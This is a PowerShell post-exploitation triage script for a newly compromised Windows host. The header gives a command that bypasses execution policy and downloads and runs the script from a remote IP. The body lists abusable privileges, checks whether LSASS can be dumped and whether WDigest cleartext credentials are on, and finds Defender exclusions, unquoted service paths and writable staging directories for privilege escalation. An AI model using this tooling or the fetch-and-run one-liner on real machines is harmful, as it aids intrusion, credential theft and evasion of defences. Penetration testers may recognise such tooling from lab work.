### HOST TRIAGE — Quick situational awareness on a new Windows box
### Run as: powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.202/host-triage.ps1')"
### Or: Import-Module .\host-triage.ps1; Invoke-HostTriage

function Invoke-HostTriage {
    Write-Host "`n[*] === HOST TRIAGE ===" -ForegroundColor Cyan

    # --- Identity ---
    Write-Host "`n[+] Identity:" -ForegroundColor Yellow
    $id = whoami
    Write-Host "    User: $id"
    $priv = whoami /priv | Select-String "Enabled"
    Write-Host "    Enabled Privs: $($priv -join ', ')"

    # Key privileges to check:
    if ($priv -match "SeImpersonatePrivilege") { Write-Host "    [!] SeImpersonatePrivilege ENABLED → PotatoAttack" -ForegroundColor Green }
    if ($priv -match "SeDebugPrivilege")       { Write-Host "    [!] SeDebugPrivilege ENABLED → can dump LSASS" -ForegroundColor Green }
    if ($priv -match "SeBackupPrivilege")      { Write-Host "    [!] SeBackupPrivilege ENABLED → can read any file" -ForegroundColor Green }
    if ($priv -match "SeTakeOwnershipPrivilege") { Write-Host "    [!] SeTakeOwnership → can take any file" -ForegroundColor Green }

    # --- Network ---
    Write-Host "`n[+] Network:" -ForegroundColor Yellow
    $ips = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch "127.0.0.1"}).IPAddress
    Write-Host "    IPs: $($ips -join ', ')"
    $gw = (Get-NetRoute -DestinationPrefix "0.0.0.0/0").NextHop
    Write-Host "    Gateway: $gw"

    # --- Domain ---
    Write-Host "`n[+] Domain Status:" -ForegroundColor Yellow
    try {
        $domain = (Get-WmiObject Win32_ComputerSystem).Domain
        Write-Host "    Domain: $domain"
        if ($domain -ne "WORKGROUP") {
            $dc = (nltest /dsgetdc:$domain 2>$null | Select-String "DC:").ToString().Trim()
            Write-Host "    DC: $dc"
        }
    } catch { Write-Host "    Domain query failed" }

    # --- Defender / AV ---
    Write-Host "`n[+] Defender Status:" -ForegroundColor Yellow
    try {
        $defStatus = Get-MpComputerStatus
        Write-Host "    RealTimeProtection: $($defStatus.RealTimeProtectionEnabled)"
        Write-Host "    AMSIEnabled: $($defStatus.AmsiFallbackReason)"
        Write-Host "    TamperProtection: $($defStatus.IsTamperProtected)"
        if ($defStatus.RealTimeProtectionEnabled -eq $false) {
            Write-Host "    [!] Defender DISABLED" -ForegroundColor Green
        }
    } catch { Write-Host "    Defender query failed (may not be installed or access denied)" }

    # --- LSA / Credential Dumping ---
    Write-Host "`n[+] LSASS Dump Feasibility:" -ForegroundColor Yellow
    $ppl = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
    Write-Host "    RunAsPPL: $ppl $(if($ppl -eq 1){'[PROTECTED - need mimidrv.sys]'} else {'[unprotected - dump freely]'})"

    $cg = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard -Name EnableVirtualizationBasedSecurity -ErrorAction SilentlyContinue).EnableVirtualizationBasedSecurity
    Write-Host "    CredentialGuard: $cg $(if($cg -eq 1){'[ACTIVE - no NTLM from LSASS]'} else {'[inactive]'})"

    $wdig = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -ErrorAction SilentlyContinue).UseLogonCredential
    Write-Host "    WDigest: $wdig $(if($wdig -eq 1){'[cleartext in LSASS]'} else {'[off - enable with reg add]'})"

    # --- AppLocker / CLM ---
    Write-Host "`n[+] AppLocker / PowerShell CLM:" -ForegroundColor Yellow
    $clm = $ExecutionContext.SessionState.LanguageMode
    Write-Host "    PS Language Mode: $clm $(if($clm -eq 'ConstrainedLanguageMode'){'[RESTRICTED - need bypass]'} else {'[FullLanguage - free]'})"

    $alPolicy = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue
    if ($alPolicy) {
        Write-Host "    AppLocker: Effective policy found → enumerate with Get-AppLockerPolicy -Effective"
    } else {
        Write-Host "    AppLocker: No effective policy detected"
    }

    # --- Defender Exclusions ---
    Write-Host "`n[+] Defender Exclusions (writable = staging area):" -ForegroundColor Yellow
    try {
        $excl = (Get-MpPreference).ExclusionPath
        if ($excl) {
            Write-Host "    Excluded Paths: $($excl -join ', ')" -ForegroundColor Green
        } else {
            Write-Host "    No path exclusions found"
        }
    } catch { Write-Host "    Cannot read exclusions (access denied)" }

    # --- Local Admins ---
    Write-Host "`n[+] Local Administrators:" -ForegroundColor Yellow
    net localgroup administrators 2>$null | Select-Object -Skip 6 | Where-Object { $_ -and $_ -notmatch "^The|^$|^-" } | ForEach-Object { Write-Host "    $_" }

    # --- Running Services (potential privesc) ---
    Write-Host "`n[+] Non-Microsoft Services (check for weak paths):" -ForegroundColor Yellow
    Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch "C:\\Windows" -and $_.State -eq "Running"} | Select-Object -First 10 | ForEach-Object {
        Write-Host "    $($_.Name): $($_.PathName)"
    }

    # --- Unquoted Service Paths ---
    Write-Host "`n[+] Unquoted Service Paths:" -ForegroundColor Yellow
    Get-WmiObject Win32_Service | Where-Object {$_.PathName -match " " -and $_.PathName -notmatch '"' -and $_.PathName -notmatch "C:\\Windows"} | Select-Object Name, PathName | ForEach-Object {
        Write-Host "    [!] $($_.Name): $($_.PathName)" -ForegroundColor Green
    }

    # --- Writable Directories (staging) ---
    Write-Host "`n[+] Common Writable Staging Directories:" -ForegroundColor Yellow
    $writableDirs = @("C:\Windows\Temp", "C:\Temp", "$env:TEMP", "C:\Users\Public", "C:\ProgramData")
    foreach ($d in $writableDirs) {
        if (Test-Path $d) {
            $acl = Get-Acl $d -ErrorAction SilentlyContinue
            Write-Host "    $d [readable]"
        }
    }

    Write-Host "`n[*] === TRIAGE COMPLETE ===`n" -ForegroundColor Cyan
}

Invoke-HostTriage
